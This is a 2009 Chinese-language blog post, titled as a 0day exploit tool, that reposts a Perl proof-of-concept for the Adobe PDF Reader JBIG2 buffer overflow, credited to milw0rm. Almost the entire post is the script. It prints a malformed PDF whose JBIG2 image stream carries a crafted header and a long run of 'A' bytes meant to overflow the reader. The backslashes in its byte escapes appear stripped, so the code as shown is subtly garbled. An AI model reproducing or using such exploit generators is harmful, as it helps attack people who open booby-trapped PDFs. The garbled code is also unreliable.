---
title: Adobe PDF阅读器JBIG2本地缓冲区溢出漏洞 0day利用工具exploit
description: AdobePDF阅读器JBIG2本地缓冲区溢出漏洞0day利用工具exploit#!/usr/bin/perl#k`sOSe02/22/2009#http://vrt-sourcefire.blogspot.com/2009/02/have-nice-weekend-pdf-love.html......
date: 2009-02-25 09:11:34
category: 漏洞信息
tags: ['PDF', '0day', 'exploit', 'PoC', '缓冲区溢出', '漏洞信息']
post_id: 795
alias: Adobe-PDF-Reader-JBIG2-Local-Buffer-Overflow-PoC
ViewNums: 4092
---

[Adobe PDF阅读器JBIG2本地缓冲区溢出漏洞 0day利用工具exploit](/blog/adobe-pdf-reader-jbig2-local-buffer-overflow-poc)

#!/usr/bin/perl
# k`sOSe 02/22/2009

# http://vrt-sourcefire.blogspot.com/2009/02/have-nice-weekend-pdf-love.html

my $size = "x40x00";
my $factor = "ABCD";
my $data = "A" x 8314;

print pdf();

sub pdf()
{

"%PDF-1.5
" .
"%xecxf5xf2xe1xe4xefxe3xf5xedxe5xeexf4
" .
"3 0
" .
"xref
" .
"3 16
" .
"0000000023 00000 n
" .
"0000000584 00000 n
" .
"0000000865 00000 n
" .
"0000001035 00000 n
" .
"0000001158 00000 n
" .
"0000001287 00000 n
" .
"0000001338 00000 n
" .
"0000001384 00000 n
" .
"0000002861 00000 n
" .
"0000003637 00000 n
" .
"0000005126 00000 n
" .
"0000005173 00000 n
" .
"0000005317 00000 n
" .
"0000005370 00000 n
" .
"0000005504 00000 n
" .
"0000000714 00000 n
" .
"trailer
" .
"<</Root 4 0 R/Info 2 0 R/ID[<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA> <AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>]/Size 19/Prev 10218>>
" .
"startxref
" .
"0
" .
"%%EOF
" .
"
" .
"4 0 obj
" .
"<</Type/Catalog/Pages 1 0 R/OCProperties<</OCGs[9 0 R 13 0 R]/D<</Order[9 0 R 13 0 R]/ON[9 0 R 13 0 R]/OFF[]>>>>>>
" .
"endobj
" .
"
" .
"5 0 obj
" .
"<</Type/Page/MediaBox[0 0 640 480]/Resources<</XObject<</Im001 7 0 R/Im002 10 0 R/Im003 11 0 R/Im004 14 0 R/Im005 16 0 R>>>>/Contents 6 0 R/Parent 1 0 R>>
" .
"endobj
" .
"6 0 obj
" .
"<</Length 56/Filter/FlateDecode>>
" .
"stream
" .
"xx9cxe3*T031Px00Ax13x0bx08x9dx9cxabxa0xefx99k``xa8xe0x92xafx10xc8x85[x81x11!x05xc6x84x14x98xc0x14xc0$@xb4x05xb2
" .
"Sxb0
" .
"x00Jx15#,
" .
"endstream
" .
"endobj
" .

"12 0 obj
" .
"<</Subtype/Image/Width 640/Height 480/ColorSpace/DeviceGray/BitsPerComponent 1/Decode[1 0]/Interpolate true/Length 1314/Filter/JBIG2Decode>>
" .
"stream
" .
"x00x00x00x01" . $size . $factor . "x13" . $data . "endstream
" .
"endobj
" .
"13 0 obj
" .
"<</Type/OCG/Name(Text Color)>>
" .
"endobj
" .
"14 0 obj
" .
"<</Subtype/Image/Width 1/Height 1/ColorSpace/DeviceGray/BitsPerComponent 8/SMask 12 0 R/OC 15 0 R/Length 1>>
" .
"stream
" .
"x00
" .
"endstream
" .
"endobj
" .

"1 0 obj
" .
"<</Type/Pages/Kids[5 0 R]/Count 1>>
" .
"endobj
" .
"xref
" .
"0 3
" .
"0000000000 65535 f
" .
"0000009988 00000 n
" .
"0000010039 00000 n
" .
"trailer
" .
"<</ID[<AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA> <AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>]/Size 3>>
" .
"startxref
" .
"104
" .
"%%EOF
";

}

# [milw0rm.com](http://www.milw0rm.com/exploits/8099) [2009-02-23]

